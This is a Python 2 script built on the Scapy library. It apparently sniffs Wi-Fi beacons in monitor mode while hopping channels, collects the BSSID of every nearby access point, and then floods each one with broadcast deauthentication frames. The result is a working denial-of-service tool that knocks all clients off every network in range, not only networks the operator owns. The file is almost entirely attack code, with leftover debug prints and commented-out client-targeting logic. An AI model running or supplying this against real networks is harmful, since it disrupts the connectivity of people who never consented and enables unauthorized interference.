from scapy.all import *
import signal
import sys
import os
from multiprocessing import Process
from subprocess import Popen

interface_wifi = 'wlan2mon'
aps = {}
aps1 = []

def no(pkt):
    if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
        try:
            bssid = pkt[Dot11].addr3
        except:
            bssid = pkt[Dot11FCS].addr3
        if bssid not in aps1:
            print bssid
            aps1.append(bssid)
    if pkt.haslayer(Dot11):
        if pkt.type == 0 and pkt.subtype == 8:
            bssid = pkt.addr2
            if bssid not in aps1:
                print bssid
                aps1.append(bssid)



# https://github.com/catalyst256/MyJunk/blob/master/scapy-deauth.py


def deauth(bssid, client):
    print bssid
    conf.iface = interface_wifi
    conf.verb = 0
    # https://canyoupwn.me/tr-scapy-ile-wireless-dos-araci-gelistirmek/
    # https://stackoverflow.com/questions/39635324/scapy-verbose-mode-documentation
    packet = RadioTap()/Dot11(type=0, subtype=12, addr1=client,
                              addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
    for i in range(0, 200):
        sendp(packet)


def channel_hop():
    while True:
        try:
            for i in range(1, 14):
                os.system('iw dev '+interface_wifi+' set channel %d' % (i))
                time.sleep(1)
        except KeyboardInterrupt:
            break


def signal_handler(sig, frame):
    # channel hops is probably dead but just do it again
    p.terminate()
    p.join()
    sys.exit(0)




# wlan*mon has lost the monitor mode
# repair it with iwconfig
os.system('ifconfig '+interface_wifi+' down')
time.sleep(1)
os.system('iwconfig '+interface_wifi+' mode monitor')
time.sleep(1)
os.system('ifconfig '+interface_wifi+' up')
p = Process(target=channel_hop)
p.start()
sniff(iface=interface_wifi, count=1000, prn=no, store=False, lfilter=lambda p: (
    Dot11Beacon in p or Dot11ProbeResp in p or Dot11 in p))
# terminate channel hop, there is no need anymore
p.terminate()
p.join()
print "Ended"
try:
    print "here1"
    #print len(aps1)
    #print aps1[0]
    # it was for client selected deauth but it's hard
    # if int(sys.argv[1])==1 and sys.argv[2]!="":
    #    for bssid in aps1:
    #        print sys.argv[2]
    #        print "here2"
    #        deauth(bssid,sys.argv[2])
    for bssid in aps1:
        deauth(bssid, "FF:FF:FF:FF:FF:FF")

except:
    print "here3"
    for bssid in aps1:
        deauth(bssid, "FF:FF:FF:FF:FF:FF")
# if int(sys.argv[1])==2:
#    for bssid in aps1:
#        deauth(bssid,"FF:FF:FF:FF:FF:FF")
signal.signal(signal.SIGINT, signal_handler)
signal.pause()
#sniff(iface='wlan1mon', prn=insert_ap, store=False,lfilter=lambda p: (Dot11Beacon in p or Dot11ProbeResp in p))
